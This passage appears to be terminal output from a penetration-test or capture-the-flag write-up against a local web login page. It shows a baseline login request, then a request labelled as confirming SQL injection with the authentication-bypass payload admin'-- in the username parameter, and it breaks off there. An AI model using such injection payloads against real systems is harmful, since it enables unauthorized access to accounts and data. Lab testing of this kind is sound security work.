[32m│[0m ```                                                                          [32m│[0m
[32m│[0m GET /index.php?username=test&password=test HTTP/1.1                          [32m│[0m
[32m│[0m Host: 127.0.0.1:32895                                                        [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m Response: Shows login form (no special message)                              [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Request 2 - SQL Injection Confirmed (admin'-- ):**                         [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m GET /index.php?username=admin'--&password= HTTP/1.1                          [32m│[0m
